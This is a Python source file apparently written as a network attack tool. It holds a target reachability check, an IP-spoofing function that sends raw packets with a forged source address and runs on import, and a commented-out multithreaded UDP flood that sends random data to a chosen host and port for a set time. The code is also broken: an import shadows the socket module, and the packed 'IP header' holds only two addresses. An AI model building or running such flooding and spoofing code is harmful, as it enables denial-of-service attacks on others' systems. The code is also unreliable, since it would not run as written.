import socket
import struct
import logging
import os
import socket
import time
from sys import argv
from threading import Thread
from socket import socket, AF_INET, SOCK_DGRAM, SOCK_STREAM


# Define the logger
logger = logging.getLogger(__name__)


def check_target_status(host, port):
    try:
        with socket(AF_INET, SOCK_STREAM) as sock:
            sock.settimeout(5)
            sock.connect((host, int(port)))
        return True
    except Exception as e:
        logger.error(f"Error connecting to {host}:{port}: {e}")
        return False

def spoof_ip_address(src_ip, dst_ip):
    try:
        # create a raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

        # set the source IP address for the outgoing packet
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.bind((src_ip, 0))

        # create an IP header with the destination IP address
        packet = struct.pack("!4s4s", socket.inet_aton(src_ip), socket.inet_aton(dst_ip))

        # send the packet
        s.sendto(packet, (dst_ip, 0))
    except socket.error as e:
        print(f"Error: {e}")

# Example usage:
spoof_ip_address("192.168.0.100", "192.168.0.200")



# def start_udp(host, port, secs, num_threads=50):
#     # Create a socket for sending UDP packets
#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     # Set a socket timeout of 1 second
#     sock.settimeout(1)
#     # Initialize the timeout with the current time + secs
#     timeout = int(time.time()) + int(secs)
#
#     # Start num_threads worker threads
#     worker_threads = []
#     for i in range(num_threads):
#         worker = threading.Thread(target=worker_thread, args=(sock, host, port, timeout))
#         worker.start()
#         worker_threads.append(worker)
#
#     # Wait for all worker threads to finish
#     for worker in worker_threads:
#         worker.join()
#
# """
#  socket timeout is set to 1 second using the settimeout method.
#  This will prevent the worker threads from blocking for too long in case of connectivity issues.
# Additionally, the worker_thread function now handles the socket.timeout exception and continues
# the loop in case of a timeout.
# This will ensure that the worker threads keep generating and sending packets
# even if the target host is not reachable.
#
# """
#
# def worker_thread(sock, host, port, timeout):
#     while int(time.time()) <= timeout:
#         try:
#             # Generate random data
#             random_data = os.urandom(256)
#             # Send the data to the target host and port
#             sock.sendto(random_data, (host, int(port)))
#         except socket.timeout:
#             continue
#         except KeyboardInterrupt:
#             exit()
#         except Exception as e:
#             print("Error:", e)
#             break